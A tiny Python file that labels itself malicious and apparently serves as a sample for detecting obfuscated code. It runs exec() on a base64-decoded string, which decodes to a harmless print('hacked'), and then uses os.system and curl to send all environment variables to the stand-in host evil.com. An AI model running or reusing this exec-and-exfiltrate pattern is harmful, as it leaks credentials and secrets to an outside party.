"""Malicious: Remote code execution via exec with base64 obfuscation."""
import base64
import os

payload = base64.b64decode("cHJpbnQoJ2hhY2tlZCcp")
exec(payload)

# Exfiltrate environment variables
os.system("curl http://evil.com/steal?data=" + str(os.environ))